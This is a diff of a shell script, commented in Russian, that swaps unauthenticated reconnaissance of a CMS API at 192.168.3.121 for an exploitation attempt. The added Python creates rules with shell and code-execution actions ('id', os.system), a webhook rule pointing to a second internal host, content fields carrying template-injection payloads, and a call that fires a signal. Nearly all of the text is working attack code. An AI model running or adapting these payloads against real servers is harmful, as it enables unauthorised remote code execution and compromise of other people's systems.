@@ -1,22 +1,42 @@
-echo "=== CMS: health/live (без auth) ==="
-R=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/health/live" 2>/dev/null)
-echo "HEALTH: $R"
-echo "=== CMS: metrics ==="
-R2=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/metrics" 2>/dev/null | head -c 300)
-echo "METRICS: $R2"
-echo "=== CMS: content-types ==="
-R3=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/content-types" 2>/dev/null | head -c 500)
-echo "CT: $R3"
-echo "=== CMS: rules (список) ==="
-R4=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/rules" 2>/dev/null | head -c 500)
-echo "RULES: $R4"
-echo "=== CMS: content (список) ==="
-R5=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/content" 2>/dev/null | head -c 500)
-echo "CONTENT: $R5"
-echo "=== CMS: workflows ==="
-R6=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/workflows" 2>/dev/null | head -c 500)
-echo "WF: $R6"
-echo "=== CMS: executions ==="
-R7=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/executions" 2>/dev/null | head -c 500)
-echo "EXEC: $R7"
-echo CMS-PROBE
+echo "=== CMS: CREATE RULE (code exec попытка) ==="
+python3 << 'RULE'
+import urllib.request,json
+B="http://192.168.3.121:8000"
+# 1. Создаём правило с Jinja2/Python инъекцией
+for payload in [
+    {"name":"cxp-test","trigger":{"type":"manual"},"action":{"type":"webhook","url":"http://192.168.3.14:8080/cxp"}},
+    {"name":"cxp-test2","trigger":{"type":"signal"},"action":{"type":"shell","command":"id"}},
+    {"name":"cxp-test3","trigger":{"type":"content.created"},"action":{"type":"code","code":"import os;os.system('id')"}},
+]:
+    req=urllib.request.Request(B+"/api/v1/rules",data=json.dumps(payload).encode(),
+        headers={"Content-Type":"application/json"})
+    try:
+        r=urllib.request.urlopen(req,timeout=8)
+        print(f"RULE-CREATE {payload['name']}: {r.status} {r.read()[:200]}")
+    except urllib.error.HTTPError as e:
+        print(f"RULE-CREATE {payload['name']}: {e.code} {e.read()[:150]}")
+# 2. Создаём content с Jinja2 SSTI
+content_payload={
+    "typeName":"article",
+    "slug":"cxp-ssti-test",
+    "status":"draft",
+    "data":{"title":"{{7*7}}","body":"${7*7} <%= 7*7 %> {% import os %}{{ os.popen('id').read() }}"}
+}
+req=urllib.request.Request(B+"/api/v1/content",data=json.dumps(content_payload).encode(),
+    headers={"Content-Type":"application/json"})
+try:
+    r=urllib.request.urlopen(req,timeout=8)
+    print(f"CONTENT-CREATE: {r.status} {r.read()[:200]}")
+except urllib.error.HTTPError as e:
+    print(f"CONTENT-CREATE: {e.code} {e.read()[:200]}")
+# 3. Fire signal
+signal={"signal_type":"manual","payload":{"cmd":"id"}}
+req=urllib.request.Request(B+"/api/v1/rules/signals/fire",data=json.dumps(signal).encode(),
+    headers={"Content-Type":"application/json"})
+try:
+    r=urllib.request.urlopen(req,timeout=8)
+    print(f"SIGNAL-FIRE: {r.status} {r.read()[:200]}")
+except urllib.error.HTTPError as e:
+    print(f"SIGNAL-FIRE: {e.code} {e.read()[:200]}")
+RULE
+echo CMS-EXEC
